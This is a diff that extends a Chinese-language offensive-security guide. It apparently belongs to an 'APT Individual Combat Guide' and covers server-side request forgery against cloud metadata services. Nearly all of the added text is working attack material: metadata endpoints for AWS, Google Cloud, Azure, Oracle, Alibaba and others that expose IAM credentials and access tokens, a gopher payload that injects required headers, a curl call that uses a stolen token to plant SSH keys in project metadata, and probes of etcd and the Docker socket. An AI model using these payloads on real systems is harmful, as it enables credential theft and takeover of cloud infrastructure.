@@ -390,6 +390,9 @@ https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http:
 http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
 ```
 
+脚本
+
+[EC2](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/SSRF/EC2.sh)
 
 (1)IAM
 
@@ -404,7 +407,7 @@ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.25
 ```
 
 使用IAM凭证交互
-```html
+```bash
 aws s3 ls --region <region-name> --access-key-id <AccessKeyId> --secret-access-key <SecretAccessKey> --session-token <Token>
 ```
 
@@ -415,4 +418,182 @@ aws s3 ls --region <region-name> --access-key-id <AccessKeyId> --secret-access-k
 然后执行以下命令提取附加角色的IAM密钥
 ```bash
 curl http://169.254.170.2/v2/credentials/<UUID>
+```
+
+(3)Elastic Beanstalk
+
+从API中检索accountId和region
+```
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+```
+
+然后从API中检索AccessKeyId、SecretAccessKey和Token
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+```
+
+然后我们将凭证与之一起使用
+```bash
+aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/
+```
+
+(4)Lambda
+
+AWS Lambda为自定义运行时提供HTTP API，以从Lambda接收调用事件并将响应数据发送回Lambda执行环境
+```
+http://localhost:9001/2018-06-01/runtime/invocation/next
+$ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
+```
+
+### Google Cloud
+
+需要"Metadata-Flavor: Google"或"X-Google-Metadata-Request: True"标头
+```
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+```
+
+递归拉取
+```
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+```
+
+Beta不需要标头
+```
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+```
+
+使用Gopher SSRF设置所需的标头
+```
+gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
+```
+
+有趣的文件
+```
+SSH公钥
+http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+
+获取访问令牌
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+
+Kubernetes
+http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
+```
+
+(1)添加SSH密钥
+
+提取令牌
+```
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+```
+
+检查令牌的范围
+```bash
+$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
+
+{
+        "issued_to": "101302079XXXXX",
+        "audience": "10130207XXXXX",
+        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
+        "expires_in": 2443,
+        "access_type": "offline"
+}
+```
+
+提交SSH密钥
+```bash
+curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
+-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
+-H "Content-Type: application/json"
+--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
+```
+
+### Digital Ocean
+
+```bash
+curl http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+
+curl http://169.254.169.254/metadata/v1.json | jq
+```
+
+### Packetcloud
+
+[文档](https://metadata.packet.net/userdata)
+
+### Azure
+
+```
+http://169.254.169.254/metadata/v1/maintenance
+```
+
+2017后，添加"Metadata: true"标头
+```
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+```
+
+### OpenStack/RackSpace
+
+```
+http://169.254.169.254/openstack
+```
+
+### HP Helion
+
+```
+http://169.254.169.254/2009-04-04/meta-data/
+```
+
+### Oracle
+
+```
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+```
+
+### Alibaba
+
+```
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+```
+
+### Kubernetes ETCD
+
+```bash
+curl -L http://127.0.0.1:2379/version
+curl http://127.0.0.1:2379/v2/keys/?recursive=true
+```
+
+### Docker
+
+```bash
+http://127.0.0.1:2375/v1.24/containers/json
+
+简单例子
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
+```
+
+### Rancher
+
+```bash
+curl http://rancher-metadata/<version>/<path>
 ```
